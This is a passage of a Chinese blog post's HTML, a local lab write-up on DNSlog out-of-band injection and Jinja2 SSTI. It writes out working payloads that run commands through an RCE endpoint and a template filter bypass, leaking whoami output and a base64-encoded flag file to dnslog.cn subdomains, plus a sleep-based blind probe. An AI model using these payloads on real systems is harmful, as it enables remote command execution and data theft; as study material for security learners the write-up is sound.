class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;Please provide a &#x27;name&#x27; parameter.&lt;/h3&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 在本地 5000 端口启动服务</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Starting Local DNSlog Lab at http://127.0.0.1:5000/&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 模拟在服务器根目录下创建一个假 flag.txt</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;flag&#123;gloria_dnslog_master_2026&#125;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>wsl里面运行</p>
+<img src="/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/2.png" class="" title="图片正常显示了喵~">
+
+<p>然后访问<code>http://127.0.0.1:5000/</code>可运行</p>
+<img src="/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/1.png" class="" title="图片正常显示了喵~">
+
+<p>这里我们先尝试一下<strong>获得当前用户名（whoami）</strong></p>
+<p>正常情况下，直接在URL里面无论输入什么都只能看到<code>Command executed!</code>是一个无回显状态</p>
+<img src="/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/7.png" class="" title="图片正常显示了喵~">
+
+<p>这时候就需要DNSlog注入</p>
+<p>首先在<code>http://dnslog.cn/</code>里获得一个自己的域名（我这里是<code>z4mwyq.dnslog.cn</code>）</p>
+<p>然后我们需要通过一种方式触发DNS域名查询，这里选择的是<code>curl</code></p>
+<p>构造paylaod为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -g -k <span class="string">&quot;http://127.0.0.1:5000/rce?cmd=curl%20http://\$(whoami).z4mwyq.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然页面仍然显示<code>Command executed!</code>，但是去<code>http://dnslog.cn/</code>里刷新一下就会看到ubuntu用户名出现在日志里面了</p>
+<img src="/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/5.png" class="" title="图片正常显示了喵~">
+
+<p>接下来我们<strong>去<code>tac /flag</code></strong></p>
+<p>flag里面存在特殊字符，因此我们要对其进行base64编码</p>
+<p>编写payload</p>
+<p>完整命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -g -k <span class="string">&quot;http://127.0.0.1:5000/rce?cmd=curl%20http://\$(cat%20flag.txt%20|%20base64%20|%20tr%20-d%20&#x27;%5Cn&#x27;%20|%20tr%20-d%20&#x27;%3D&#x27;).gj2hsc.dnslog.cn&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>前面的部分都是一样的，主要是<code>cmd=</code>后面那一块</p>
+<p>原本的真实命令是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://$(<span class="built_in">cat</span> flag.txt | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span>).gj2hsc.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>| base64</code>：是把上一步读到的flag转化为base64编码</li>
+<li><code>| tr -d &#39;\n&#39;</code>：<code>tr -d</code>代表删除，这一步<strong>用于删除换行符</strong>，原因是base64编码工具在处理较长数据的时候，会<strong>默认每76个字符自动换行</strong>，换行符会把整个URL截断导致curl报错</li>
+<li><code>| tr -d &#39;=&#39;</code>：用于删除base64结尾的等号，因为有些严格的DNS服务器不认识<code>=</code>，可能会导致解析失败，回头本地手动补齐解密就行</li>
+<li><code>$()</code>：命令替换，在linux里面<code>$()</code>的优先级最高</li>
+</ul>
+<p>得到flag</p>
+<p>（这里因为过了一段时间所以重新获取了一个域名，不过其他的都不变）</p>
+<img src="/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/8.png" class="" title="图片正常显示了喵~">
+
+<p>得到<code>ZmxhZ3tnbG9yaWFfZG5zbG9nX21hc3Rlcl8yMDI2fQ</code></p>
+<p>然后补上两个&#x3D;去解码就行，得到flag</p>
+<img src="/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/9.png" class="" title="图片正常显示了喵~">
+
+<p>然后我们来看<strong>SSTI注入</strong></p>
+<p>测试之后发现ban掉<code>&#123;&#123;</code>和<code>print</code></p>
+<p>完整payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -g -k -G --data-urlencode <span class="string">&quot;name=&#123;百分号 if lipsum.__globals__.os.popen(&#x27;curl http://\$(cat flag.txt|base64|tr -d \&quot;\n\&quot;|tr -d \&quot;=\&quot;).m28550.dnslog.cn&#x27;).read() 百分号&#125;&#123;百分号 endif 百分号&#125;&quot;</span> <span class="string">&quot;http://127.0.0.1:5000/ssti&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>完整paylaod</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -g -k <span class="string">&quot;http://127.0.0.1:5000/ssti?name=&#123;百分号20if%20lipsum.__globals__.os.popen(&#x27;if%20[%20\$(cat%20flag.txt%20%7C%20cut%20-c%201)%20=%20%22f%22%20];%20then%20sleep%203;%20fi&#x27;).read()%20百分号&#125;&#123;百分号20endif%20百分号&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>跑路去复习之前的知识惹……</p>
+
+    </div>
+    <footer class="article-footer">
+        <a data-aos="zoom-in" href="/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/#comments" class="article-comment-link">
+          <span class="post-comments-count valine-comment-count" data-xid="/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/" itemprop="commentCount"></span>
+          Comments
+        </a>
+        <span data-aos="zoom-in" id="/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/" class="leancloud_visitors article-visitor-link" data-flag-title="DNSlog注入以及内存马注入喵">
+          <span class="leancloud-visitors-count">0</span>
+          <em class="post-meta-item-text">Readings</em>
+        </span>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/DNSlog%E6%B3%A8%E5%85%A5/" rel="tag" title="DNSlog注入">DNSlog注入</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag" title="Web安全">Web安全</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+        <img data-src="/images/32.jpg" data-sizes="auto" alt="web做题日记之SSTI喵" class="lazyload">
+      <a href="/2026/04/11/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8BSSTI%E5%96%B5/" aria-label="Next: web做题日记之SSTI喵"  title="Next: web做题日记之SSTI喵"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          web做题日记之SSTI喵
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="valine">
+              <span>valine</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+        <div class="comment valine-comment" data-aos="fade-up"
+          id="valine-comment">
+        </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+      <span class="footer-info-sep rotate"></span>
+      Gloria
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        43.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        03:15
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">DNSlog注入以及内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">DNSlog注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">核心原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BE%E4%B8%AA%E6%A0%97%E5%AD%90"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">举个栗子 ~</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog%E4%B8%89%E5%A4%A7%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text">DNSlog三大姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-RCE%EF%BC%88Linux%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">命令注入&#x2F;RCE（Linux环境）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8%EF%BC%88MySQL%E7%9A%84UNC%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">SQL盲注（MySQL的UNC共享文件机制）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSTI%EF%BC%88Jinja2%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">SSTI（Jinja2模板引擎的命令执行机制）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%B5%85%E5%86%99%E4%B8%AA%E5%B0%8F%E6%BC%8F%E6%B4%9E%E8%AF%95%E4%B8%80%E8%AF%95DNSlog%E7%9A%84%E5%8E%89%E5%AE%B3%E2%80%A6%E2%80%A6"><span class="toc-number">1.2.4.</span> <span class="toc-text">这里浅写个小漏洞试一试DNSlog的厉害……</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Gloria" class="lazyload">
+  <div class="sidebar-author-name">Gloria</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+</div>
+<div class="sidebar-social">
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+      window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+    }
+  </script>
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Gloria",
+          title: "DNSlog注入以及内存马注入喵",
+          url: "http://example.com/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/",
+          excerpt: "",
+          description: "",
+          stripContent: "DNSlog注入以及内存马注入[TOC] 啊……这部分作为SSTI的一个补充喵 先来看一下DNSlog注入 DNSlog注入DNDlog注入，又称为带外攻击（OOB，Out-of-Band），专门用来应付无回显的一种技术 核心原理在理解DNSlog之前，先来了解一下：当我们在浏览器输入一个域名时，网络上到底发生了什么 假设我们输入gloria.com 我的电脑💻不知道这台服务器的ip，所以向DNS服务器询问：gloria.com的ip是多少？ 如果这个域名有一台专门的权威DNS服务器，这个询问",
+          date: "Thu Jun 18 2026 20:50:21 GMT+0800",
+          updated: "Mon Jun 22 2026 22:09:11 GMT+0800",
+          cover: "/images/24.jpg",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+        
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["valine"];
+  var commentConfig = {
+    valine: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.valine-comment');
+        if (!container) return;
+        if (container.style.display === 'block') return; // already loaded
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/valine@1.5.1/dist/Valine.min.js',
+          'sha384-3ma91AExDeMAZ1rjTjaP8V2A2obQE+s5ltKRwYlwdpArz9xVbp0tF3b0VV2ACNPn'
+        );
+        script.onload = () => {
+          var GUEST_INFO = ['nick', 'mail', 'link'];
+          var guest_info = 'nick,mail,link'.split(',').filter((item) => {
+            return GUEST_INFO.indexOf(item) > -1
+          });
+          var recordIP = JSON.parse('true');
+          var highlight = JSON.parse('true');
+          var visitor = JSON.parse('true');
+          var serverURLs = undefined;
+
+          if (window.Valine) {
+            new Valine({
+              el: '.valine-comment',
+              appId: "kvVONbiLMyDuTRiZvZ1bTwdK-gzGzoHsz",
+              appKey: "3n0P97K1hXTVGGSYeh03GY57",
+              placeholder: "说点什么喵",
+              pageSize: '10',
+              avatar: 'mp',
+              lang: document.documentElement.lang || 'en',
+              recordIP: recordIP,
+              highlight: highlight,
+              visitor: visitor,
+              requiredFields: guest_info,
+              path: window.location.pathname,
+              serverURLs
+            });
+          }
+        };
+        document.head.appendChild(script);
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.4' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+  </body>
+  </html>
